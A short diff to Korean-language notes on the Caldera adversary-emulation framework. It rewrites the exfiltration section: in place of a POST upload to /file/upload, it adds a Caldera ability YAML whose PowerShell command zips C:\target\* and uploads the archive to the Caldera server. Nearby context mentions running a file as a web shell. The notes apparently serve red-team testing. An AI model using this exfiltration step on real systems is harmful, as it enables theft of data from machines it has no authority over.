@@ -56,10 +56,18 @@ Caldera 서버에 업로드된 파일 (이용하려면 payload 에 적어줘야�
 - 복사 후 웹셸로 실행
 
 ### 데이터 유출 (Exfiltration)
-**방법**: Agent에서 Caldera 서버로 파일 전송
-- Caldera server 업로드 경로: /file/upload
-- 방식: POST 요청
-- 파일 업로드: -InFile 파라미터 사용
+
+**Caldera Ability의 uploads 필드 사용**
+- Ability YAML에 `uploads:` 필드 지정하면 Agent가 자동으로 Caldera 서버로 파일 전송
+- 예시:
+  ```yaml
+  executors:
+    - platform: windows
+      name: psh
+      command: Compress-Archive -Path C:\target\* -DestinationPath C:\temp\data.zip
+      uploads:
+        - C:\temp\data.zip
+  ```
 
 ---
 
